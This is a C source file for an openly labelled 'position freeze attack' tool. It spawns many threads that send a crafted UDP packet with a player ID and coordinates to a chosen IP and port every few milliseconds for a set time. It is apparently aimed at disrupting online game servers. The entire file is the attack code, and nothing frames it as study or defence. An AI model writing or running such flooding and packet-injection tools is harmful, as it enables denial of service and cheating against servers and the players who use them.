#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./program ip port time threads\n");
    exit(1);
}

struct thread_data {
    char ip[64];
    int port;
    int time;
};

void *freeze_positions(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    unsigned char freeze_packet[64];
    memset(freeze_packet, 0, sizeof(freeze_packet)); // Initialize

    // Example: Simulating a frozen player position at (X: 100, Y: 200, Z: 50)
    freeze_packet[0] = 1;   // Player ID
    freeze_packet[1] = 100; // X Position
    freeze_packet[2] = 200; // Y Position
    freeze_packet[3] = 50;  // Z Position

    printf("Freezing players at position (100, 200, 50)\n");

    while (time(NULL) <= endtime) {
        if (sendto(sock, freeze_packet, sizeof(freeze_packet), 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
        usleep(5000); // Small delay to keep ping normal
    }

    close(sock);
    free(data);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));

    printf("Starting position freeze attack on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        strcpy(data->ip, ip);
        data->port = port;
        data->time = time;

        if (pthread_create(&thread_ids[i], NULL, freeze_positions, (void *)data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Started thread: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}




